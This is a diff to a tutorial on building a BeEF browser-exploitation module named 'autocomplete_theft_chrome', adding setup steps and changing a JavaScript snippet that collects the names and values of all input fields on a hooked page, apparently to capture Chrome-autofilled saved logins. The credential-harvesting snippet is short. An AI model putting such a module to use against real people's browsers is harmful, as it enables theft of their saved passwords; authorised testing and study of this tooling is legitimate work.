@@ -12,6 +12,8 @@ We will call this module `autocomplete_theft_chrome`.
 
 First decide a category that this module will sit in. This module should not require much user interaction (the input fields on the hooked page is just auto completed by the Chrome browser if a match is found in saved logins.) Looking at existing categories (https://github.com/beefproject/beef/tree/master/modules), looks like this module will fit in the `browser` category.
 
+### Method 1: copy existing module as template
+
 A good starting point to create a module is to base the template off existing modules. For this example, we will copy the "template" from the `social_engineering/autocomplete_theft` module, which only works on firefox.
 
 ```sh
@@ -26,6 +28,34 @@ modules/social_engineering/autocomplete_theft/module.rb -> modules/browser/autoc
 modules/social_engineering/autocomplete_theft/config.yaml -> modules/browser/autocomplete_theft_chrome/config.yaml
 modules/social_engineering/autocomplete_theft/command.js -> modules/browser/autocomplete_theft_chrome/command.js
 ```
+
+### Method 2: start from scratch
+
+If you do not wish to copy any config files, you can make a folder under the preferred category named after your module.
+
+`mkdir modules/browser/autocomplete_theft_chrome`
+
+Then, create 3 files in that directory:
+
+```sh
+touch modules/browser/autocomplete_theft_chrome/config.yaml
+touch modules/browser/autocomplete_theft_chrome/module.rb
+touch modules/browser/autocomplete_theft_chrome/command.js
+```
+
+
+**Note**
+
+Make sure your module name (e.g. autocomplete_theft_chrome) in config.yaml does not clash with another module.
+
+To make sure of this, run this command (replace autocomplete_theft_chrome with your new module's name)
+```sh
+find . -name autocomplete_theft_chrome
+```
+
+There should be only one result. If there are more than one, change the name.
+
+
 
 ## the config file
 
@@ -47,6 +77,8 @@ beef:
                 not_working: ["ALL"]
 
 ```
+
+> If you have any questions about what the fields in the config file means, check https://github.com/beefproject/beef/wiki/Module-Creation
 
 First we change the name of the module in the structure of the yaml file:
 ```yaml
@@ -107,15 +139,6 @@ beef:
                 user_notify: ["ALL"]
 ```
 
-**Note**
-Make sure your module name (e.g. autocomplete_theft_chrome) in config.yaml does not clash with another module.
-
-To make sure of this, run this command (replace autocomplete_theft_chrome with your module's name in the config file)
-```sh
-grep -rn "autocomplete_theft_chrome" . | grep config.yaml
-```
-
-There should be only one result. If there are more than one, change the name.
 
 ## module options and results (module.rb)
 
@@ -202,7 +225,7 @@ The data we want to send, in this case, is all the input name:value pairs. So, i
 ```js
 data = '';
 for (x of document.querySelectorAll("input")) { 
-    data += x.name + ":" + x.value + "\n";
+    data += x.name + ":" + x.value + "|";
 }
 ```
 
